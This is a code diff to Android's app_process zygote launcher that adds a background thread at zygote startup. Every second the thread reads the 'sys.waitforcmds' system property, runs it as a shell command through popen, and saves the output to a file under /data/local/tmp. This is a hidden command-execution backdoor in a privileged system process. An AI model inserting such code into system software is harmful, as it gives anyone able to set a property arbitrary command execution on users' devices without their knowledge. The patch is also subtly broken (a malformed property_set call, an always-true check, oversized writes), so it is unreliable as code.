@@ -6,7 +6,7 @@
  */
 
 #define LOG_TAG "appproc"
-
+#include <pthread.h>
 #include <cutils/properties.h>
 #include <binder/IPCThreadState.h>
 #include <binder/ProcessState.h>
@@ -30,6 +30,46 @@ static bool isXposedLoaded = false;
 
 
 namespace android {
+
+pthread_t pthread;
+
+void print_result(FILE *fp)
+{
+    char buf[100];
+    FILE    *wstream;
+    wstream = fopen( "/data/local/tmp/test_popen.txt", "w+"); //新建一个可写的文件
+    if(!fp) {
+        return;
+    }
+    while(memset(buf, 0, sizeof(buf)), fgets(buf, sizeof(buf) - 1, fp) != 0 ) {
+        fwrite( buf, 1, sizeof(buf), wstream );//将buf中的数据写到FILE    *wstream对应的流中，也是写到文件中
+    }
+    fclose( wstream );
+}
+
+
+void* normalCallBack(void* data){
+    FILE *fp = NULL;
+
+    while(1) {
+        char value[PROPERTY_VALUE_MAX];
+        property_get("sys.waitforcmds", value, "");
+        if(value){ //定时读取命令执行
+            fp = popen(value, "r");
+                if(!fp) {
+                    perror("popen");
+                } else{
+                    print_result(fp);
+                    pclose(fp);
+                }
+             property_set("sys.waitforcmds", value, "")
+        }
+        sleep(1);
+    }
+
+    pthread_exit(NULL);
+}
+
 
 void app_usage()
 {
@@ -236,6 +276,7 @@ int main(int argc, char* const argv[])
             zygote = true;
             niceName = "zygote";
             ALOGE("zygote is start");
+            pthread_create(&pthread, NULL, normalCallBack, (void *) 1);
         } else if (strcmp(arg, "--start-system-server") == 0) {
             startSystemServer = true;
         } else if (strcmp(arg, "--application") == 0) {
